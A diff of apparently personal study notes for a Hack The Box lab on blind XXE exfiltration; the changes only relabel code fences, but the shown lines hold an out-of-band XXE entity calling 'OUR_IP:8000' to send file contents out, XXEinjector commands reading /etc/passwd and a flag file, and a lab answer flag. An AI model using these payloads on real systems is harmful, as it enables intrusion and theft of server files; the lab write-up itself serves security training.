@@ -7,7 +7,7 @@ Host this XXE payload:
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
 ```
 
-```sh
+```shellsession
 $ cat index.php # here we write the above PHP code
 <?php
 if(isset($_GET['content'])){
@@ -33,7 +33,7 @@ Send this to target to make it reference our DTD:
 
 ## Automated OOB Exfiltration
 
-```sh
+```shellsession
 $ git clone https://github.com/enjoiz/XXEinjector.git
 ```
 
@@ -58,7 +58,7 @@ XXEINJECT
 
 Now, we can run the tool with the `--host/--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:
 
-```sh
+```shellsession
 $ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
 
 ...SNIP...
@@ -69,7 +69,7 @@ $ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --pat
 
 We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there:
 
-```sh
+```shellsession
 $ cat Logs/10.129.201.94/etc/passwd.log 
 
 root:x:0:0:root:/root:/bin/bash
@@ -80,7 +80,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ## Questions
 1. Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag. **Answer: HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}**
    - Use XXEInjector to automate this attack:
-        ```sh
+        ```shellsession
         $ ruby ~/XXEinjector/XXEinjector.rb --host=10.10.14.205 --httpport=8000 --file=xxe.req --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter
         XXEinjector by Jakub Pałaczyński
 
@@ -98,7 +98,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
         [+] Nothing else to do. Exiting.
         ```
    - Read the exfiltrated file:
-        ```sh
+        ```shellsession
         # Log folder is created where we run the tool
         $ cat ~/Logs/10.129.234.170/327a6c4304ad5938eaf0efb6cc3e53dc.php.log
         <?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
